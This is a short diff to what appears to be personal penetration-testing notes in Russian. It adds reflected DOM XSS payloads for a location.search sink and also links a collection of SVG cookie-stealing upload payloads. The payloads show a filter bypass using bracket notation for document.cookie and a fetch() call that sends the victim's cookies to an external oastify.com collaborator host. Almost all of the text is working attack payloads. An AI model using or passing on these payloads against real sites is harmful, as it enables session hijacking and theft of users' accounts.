@@ -18,5 +18,14 @@ payload
 https://github.com/h6nt3r/file_upload_payloads/blob/main/xss/rxss/cookie.svg
 
 
+Reflected DOM XSS 
+уязвимый sink location.search 
+payload
+\\"-alert(1)}// работает
+\\"-alert(document.cookie)}// блочит
+\\"-alert(window['document']['cookie'])}//  срабатывает
+через fetch берем свои куки
+\\"-fetch('https://er9q2scjsandq0qk5espe78bt2ztnubj.oastify.com?reflects='+window['document']['cookie'])}//
+
 
 
